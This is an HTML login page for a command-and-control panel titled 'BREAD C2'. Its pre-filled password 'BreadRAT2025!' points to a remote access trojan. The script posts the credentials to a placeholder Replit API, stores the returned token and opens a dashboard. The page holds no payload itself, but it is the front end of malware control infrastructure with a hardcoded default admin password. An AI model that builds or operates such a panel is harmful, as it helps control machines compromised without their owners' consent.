<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BREAD C2 - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="login-card">
        <h3>🍞 BREAD C2</h3>
        <p class="text-muted">Login to Control Panel</p>
        <form id="loginForm">
            <div class="mb-3">
                <label class="form-label">Username</label>
                <input type="text" class="form-control" id="username" value="admin" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Password</label>
                <input type="password" class="form-control" id="password" value="BreadRAT2025!" required>
            </div>
            <button type="submit" class="btn btn-primary w-100">Login</button>
        </form>
        <div id="errorMsg" class="text-danger mt-2"></div>
    </div>
    <script>
        const API_BASE = 'https://nama-repl-mu.username.repl.co'; // GANTI!
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            try {
                const res = await fetch(API_BASE + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();
                if (data.token) {
                    localStorage.setItem('token', data.token);
                    localStorage.setItem('api_base', API_BASE);
                    window.location.href = 'dashboard.html';
                } else {
                    document.getElementById('errorMsg').innerText = data.error || 'Login failed';
                }
            } catch (err) {
                document.getElementById('errorMsg').innerText = 'Network error: ' + err.message;
            }
        });
    </script>
</body>
</html>
